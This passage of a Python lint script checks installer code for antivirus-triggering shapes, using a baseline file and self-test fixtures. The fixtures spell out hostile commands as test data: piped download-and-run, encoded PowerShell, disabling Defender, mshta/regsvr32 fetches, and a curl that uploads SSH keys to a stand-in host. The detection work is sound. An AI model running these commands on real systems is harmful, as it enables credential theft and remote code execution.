        BASELINE_PATH.write_text(json.dumps(document, indent = 2) + "\n", encoding = "utf-8")
        print(f"baseline: {len(groups)} groups, {len(findings)} findings")
        return 0

    new = []
    seen: dict = {}
    for f in findings:
        key = (f.file, f.rule, f.digest)
        seen[key] = seen.get(key, 0) + 1
        if seen[key] > allowed.get(key, 0):
            new.append(f)
    errors = [f for f in new if f.severity == "error"]
    warnings = [f for f in new if f.severity == "warn"]

    if arguments.json:
        Path(arguments.json).write_text(
            json.dumps(
                [dict(rule = f.rule, file = f.file, line = f.line, severity = f.severity, text = f.text,
                      what = RULES_BY_ID[f.rule].what, why = RULES_BY_ID[f.rule].why, fix = RULES_BY_ID[f.rule].fix)
                 for f in new],
                indent = 2,
            ) + "\n",
            encoding = "utf-8",
        )  # fmt: skip

    for f in warnings:
        print(_explain(f))
    for f in errors:
        print(_explain(f))

    problems = 0
    if errors:
        print(
            f"{len(errors)} new error(s). Redesign the line as suggested. If it really has to stay, add "
            "`lint-allow: <rule> <reason>` on or above it (not in the shipped installers), or run "
            "`python scripts/lint_av_shapes.py --update` and write the reason into scripts/av_shapes_baseline.json."
        )
        problems = 1

    if not arguments.paths:
        unreviewed = sorted(
            key
            for key in error_groups
            if not reasons.get(key) or reasons[key] in ("REVIEW ME", "pre-existing warning")
        )
        if unreviewed:
            print(f"{len(unreviewed)} baseline group(s) for error rules carry no reason:")
            for file, rule in unreviewed:
                print(f"  {file}  {rule}")
            problems = 1
        # Fewer occurrences than recorded is stale too: the spare count would let a copy back in.
        stale = sorted(
            k for k in allowed if (k[0], k[1]) in error_groups and observed.get(k, 0) < allowed[k]
        )
        if stale:
            # An entry that outlives its line would quietly re-permit whatever lands on that digest next.
            print(
                f"{len(stale)} baseline entr(y/ies) allow more than the code still has. Run --update:"
            )
            for file, rule, digest in stale:
                print(f"  {file}  {rule}  {digest}")
            problems = 1

    if not problems:
        print(
            f"ok: {len(findings)} recorded finding(s), {len(warnings)} new warning(s), 0 new errors"
        )
    return problems


# ---- self-test: every rule fires on its shape and stays quiet on the rewrite --------------------
def _fixtures() -> list[tuple[str, str, str, bool]]:
    """(rule, file name, text, should fire). Built here, in memory, never written to disk."""
    q = '"'
    return [
        (
            "AV001",
            "t.py",
            "probe = '''Add-Type -MemberDefinition @'\n["
            + _DLLIMPORT
            + "("
            + q
            + _J(("kernel", "32.dll"))
            + q
            + ")] public static extern bool "
            + _J(("Free", "Console"))
            + "();\n'@'''",
            True,
        ),
        ("AV001", "t.py", "# the native import used to live here\nimport ctypes\n", False),
        (
            "AV002",
            "t.ps1",
            "$p = " + _J(("Virtual", "AllocEx")) + "($h, 0, 4096, 0x3000, 0x40)",
            True,
        ),
        ("AV002", "t.ps1", "$p = Get-Process -Id $pid", False),
        (
            "AV003",
            "install.ps1",
            "$asm = [AppDomain]::CurrentDomain."
            + _J(("Define", "Dynamic", "Assembly"))
            + "($n, 'Run')",
            True,
        ),
        ("AV003", "install.ps1", "$mode = Get-ConsoleMode", False),
        ("AV004", "t.ps1", "powershell.exe " + _ENC_CMD + " ZQBjAGgAbwAgAGgAaQA=", True),
        ("AV004", "t.ps1", "powershell.exe -NoProfile -File setup.ps1", False),
        ("AV005", "t.ps1", "irm https://example.invalid/x.ps1 | " + _J(("i", "ex")), True),
        ("AV005", "t.ps1", "Invoke-WebRequest https://example.invalid/x.ps1 -OutFile x.ps1", False),
        (
            "AV006",
            "t.ps1",
            _J(("Set", "-Mp", "Preference")) + " -Disable" + "RealtimeMonitoring $true",
            True,
        ),
        ("AV006", "t.ps1", "Get-MpComputerStatus", False),
        (
            "AV007",
            "t.ps1",
            "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy "
            + _J(("By", "pass"))
            + " -File a.ps1'",
            True,
        ),
        (
            "AV007",
            "t.ps1",
            "Start-Process powershell -ArgumentList '-ExecutionPolicy RemoteSigned -File a.ps1'",
            False,
        ),
        (
            "AV008",
            "s.py",
            "import os, requests\nHOME = os.environ['HOME']\nA = 'Login"
            + " Data'\nB = 'wallet"
            + ".dat'\nrequests.post(u)\n",
            True,
        ),
        (
            "AV008",
            "s.py",
            "import os, requests\nHOME = os.environ['HOME']\nA = ''.join(('Login', ' Data'))\nrequests.post(u)\n",
            False,
        ),
        (
            "AV009",
            "t.py",
            "source = Path(os.environ['SystemRoot']) / 'System32' / 'where.exe'\nshutil.copyfile(source, tmp / 'llama-server.exe')\n",
            True,
        ),
        (
            "AV009",
            "t.py",
            "from windows_console_stub import console_stub_bytes\n(tmp / 'llama-server.exe').write_bytes(console_stub_bytes(0))\n",
            False,
        ),
        (
            "AV010",
            "t.py",
            "import subprocess\n(d / 'trusted-signing-cli.exe').write_bytes(b'not an executable')\nsubprocess.run([d / 'trusted-signing-cli.exe'])\n",
            True,
        ),
        ("AV010", "t.py", "import subprocess\n(d / 'notes.txt').write_bytes(b'text')\n", False),
        ("AV011", "t.bat", "certutil -urlcache -split -f http://example.invalid/a.exe a.exe", True),
        ("AV011", "t.bat", "certutil -hashfile a.exe SHA256", False),
        ("AV012", "t.ps1", "Register-ScheduledTask -TaskName x -Action $a", True),
        ("AV012", "t.ps1", "Get-ScheduledTask", False),
        ("AV013", "t.ps1", "$s = -join [char[]](73,69,88)", True),
        ("AV013", "t.ps1", "$s = 'plain'", False),
        ("AV014", "install.ps1", "# keeps the " + "anti" + "virus heuristic quiet", True),
        ("AV014", "install.ps1", "# resolves the venv python before the first pip call", False),
        ("AV015", "t.ps1", "$sb = [scriptblock]::Create($text)", True),
        ("AV015", "t.ps1", ". $PSScriptRoot/helpers.ps1", False),
        (
            "AV016",
            "t.sh",
            "python3 -c 'import sys, zipfile; zipfile."
            + _J(("Zip", "File"))
            + "(sys.argv[1])."
            + _J(("extract", "all"))
            + '(sys.argv[2])\' "$1" "$2"',
            True,
        ),
        ("AV016", "t.sh", 'python3 -m zipfile -e "$1" "$2"', False),
        (
            "AV016",
            "t.sh",
            "python3 -c 'import zipfile; zipfile."
            + _J(("Zip", "File"))
            + "(a).extract("
            + '"uv")'
            + "'",
            True,
        ),
        (
            "AV016",
            "t.mjs",
            "const cmd = "
            + '"'
            + "python3 -c 'import zipfile; zipfile."
            + _J(("Zip", "File"))
            + "(a)."
            + _J(("extract", "all"))
            + "(b)'"
            + '"',
            False,
        ),
        # Options before the command flag, with an argument or combined with it.
        (
            "AV016",
            "t.sh",
            "python3 -W ignore -c 'import zipfile; zipfile.ZipFile(a)."
            + _J(("extract", "all"))
            + "(b)'",
            True,
        ),
        (
            "AV016",
            "t.sh",
            "python3 -Ic 'import tarfile; tarfile.open(a)." + _J(("extract", "all")) + "(b)'",
            True,
        ),
        (
            "AV016",
            "t.sh",
            "python3 -c 'import shutil; shutil." + _J(("unpack_", "archive")) + "(a, b)'",
            True,
        ),
        (
            "AV016",
            "t.sh",
            'python3 -c "import zipfile; zipfile.ZipFile(\\"a.zip\\").'
            + _J(("extract", "all"))
            + '(\\"out\\")"',
            True,
        ),
        (
            "AV016",
            "t.sh",
            'perl -e \'use Archive::Tar; Archive::Tar->new("a.tar")->'
            + _J(("ext", "ract"))
            + "()'",
            True,
        ),
        (
            "AV016",
            "t.sh",
            "python3 -c 'from bs4 import BeautifulSoup; BeautifulSoup(x).div."
            + _J(("ext", "ract"))
            + "()'",
            False,
        ),
        # Reading or checking an archive unpacks nothing.
        (
            "AV016",
            "t.sh",
            "python3 -c 'print(1)'  # a later archive."
            + _J(("ext", "ract"))
            + "() call is not this one",
            False,
        ),
        (
            "AV016",
            "t.sh",
            "python3 -c 'import sys, zipfile; print(zipfile.is_zipfile(sys.argv[1]))' \"$f\"",
            False,
        ),
        (
            "AV016",
            "t.sh",
            "python3 -c 'import zipfile; print(zipfile.ZipFile(a).namelist())'",
            False,
        ),
        (
            "AV016",
            "t.py",
            "zipfile." + _J(("Zip", "File")) + "(path)." + _J(("extract", "all")) + "(dest)",
            False,
        ),
        # Spellings PowerShell accepts that a first cut of these rules missed.
        (
            "AV002",
            "t.ps1",
            "$p = " + _J(("virtual", "allocEx")) + "($h, 0, 4096, 0x3000, 0x40)",
            True,
        ),
        (
            "AV003",
            "t.ps1",
            "$a = $d." + _J(("define", "dynamic", "assembly")) + "($n, 'Run')",
            True,
        ),
        ("AV004", "t.ps1", "powershell -enc " + q + "ZQBjAGgAbwAgAGgAaQA=" + q, True),
        ("AV005", "t.ps1", "irm 'https://example.invalid/x.ps1' | " + _J(("i", "ex")), True),
        ("AV005", "t.ps1", "irm https://unsloth.ai/install.ps1 | " + _J(("i", "ex")), True),
        (
            "AV005",
            "t.ps1",
            "Write-Host 'irm https://unsloth.ai/install.ps1 | " + _J(("i", "ex")) + "'",
            False,
        ),
        (
            "AV006",
            "t.ps1",
            _J(("Set", "-Mp", "Preference")) + " -Disable" + "RealtimeMonitoring:$true",
            True,
        ),
        (
            "AV008",
            "s.ps1",
            "$h = $ENV:APPDATA\nINVOKE-WebRequest $u\n$a = 'WALLET"
            + ".DAT'\n$b = '"
            + _J(("ID_", "RSA"))
            + "'\n",
            True,
        ),
        (
            "AV009",
            "t.py",
            "shutil.copy2(\n    Path(os.environ['SystemRoot']) / 'System32' / 'where.exe',\n    tmp / 'llama-server.exe',\n)\n",
            True,
        ),
        ("AV011", "t.bat", "mshta " + q + "https://example.invalid/a.hta" + q, True),
        (
            "AV011",
            "t.bat",
            "regsvr32 /s /i:" + q + "https://example.invalid/a.sct" + q + " scrobj.dll",
            True,
        ),
        ("AV004", "t.ps1", "powershell.exe -en " + q + "ZQBjAGgAbwAgAGgAaQA=" + q, True),
        (
            "AV006",
            "t.ps1",
            _J(("Set", "-Mp", "Preference")) + " -Exclusion" + "Path C:\\work",
            True,
        ),
        (
            "AV007",
            "t.ps1",
            "$visibility = 'Hidden'\npowershell -ExecutionPolicy "
            + _J(("By", "pass"))
            + " -File a.ps1",
            False,
        ),
        (
            "AV008",
            "s.py",
            "import os, requests\nk = os.environ['HOME'] + '/.sol"
            + "ana/validator_key'\nrequests.post(u)\n",
            True,
        ),
        (
            "AV005",
            "t.ps1",
            "irm https://example.invalid/x.ps1 -UseBasicParsing | " + _J(("i", "ex")),
            True,
        ),
        (
            "AV007",
            "t.bat",
            "powershell.exe -WindowStyle:Hidden -ExecutionPolicy:"
            + _J(("By", "pass"))
            + " -File a.ps1",
            True,
        ),
        ("AV009", "t.ps1", "copy $env:SystemRoot\\System32\\where.exe .\\tool.exe", True),
        (
            "AV011",
            "t.ps1",
            "& "
            + q
            + "C:\\Windows\\System32\\ms"
            + "hta.exe"
            + q
            + " "
            + q
            + "https://example.invalid/a.hta"
            + q,
            True,
        ),
        (
            "AV008",
            "s.sh",
            "#!/bin/sh\nset -eu\ncurl -F key=@$HOME/.ssh/"
            + _J(("id_", "rsa"))
            + " https://example.invalid/u\ncat $HOME/.aws/credentials\n",
            True,
        ),
        ("AV004", "t.sh", "base64 --decode archive.b64 | tar -xf -", False),
        ("AV004", "t.sh", "echo $p | base64 -d | sh", True),
        ("AV004", "t.ps1", "$der = [Convert]::" + _FROM_B64 + "($certificate)", True),
        (
            "AV007",
            "t.py",
            "argv = [\n    "
            + q
            + "-WindowStyle"
            + q
            + ",\n    "
            + q
            + "Hidden"
            + q
            + ",\n    "
            + q
            + "-ExecutionPolicy"
            + q
            + ",\n    "
            + q
            + _J(("By", "pass"))
            + q
            + ",\n]",
            True,
        ),
        (
            "AV008",
            "s.py",
            "import os, requests\nh = os.environ['HOME']\na = h + '/.ssh/"
            + _J(("id_", "rsa"))
            + "'\nb = h + '/.ssh/"
            + _J(("id_", "ed25519"))
            + "'\nrequests.post(u)\n",
            True,
        ),
        # Suppression is honoured outside the shipped installers and ignored inside them.
        (
            "AV015",
            "t.ps1",
            "$sb = [scriptblock]::Create($text)  # lint-allow: AV015 loads a function body under test",
            False,
        ),
        (
            "AV003",
            "install.ps1",
            "# lint-allow: AV003 because I said so\n$b = $m."
            + _J(("Define", "PInvoke", "Method"))
            + "()",
            True,
        ),
    ]


def self_test() -> int:
    failures = []
    for rule, name, text, should_fire in _fixtures():
        fired = any(f.rule == rule for f in scan_text(name, text))
        if fired != should_fire:
            failures.append(
                f"{rule} on {name}: expected {'a finding' if should_fire else 'none'}, got {'one' if fired else 'none'}"
            )
    covered = {rule for rule, _, _, fire in _fixtures() if fire}
    missing = sorted(set(RULES_BY_ID) - covered)
    if missing:
        failures.append(f"rules with no firing fixture: {', '.join(missing)}")
    if failures:
        print("self-test FAILED:\n  " + "\n  ".join(failures))
        return 1
    print(f"self-test: ok ({len(_fixtures())} fixtures, {len(RULES)} rules)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
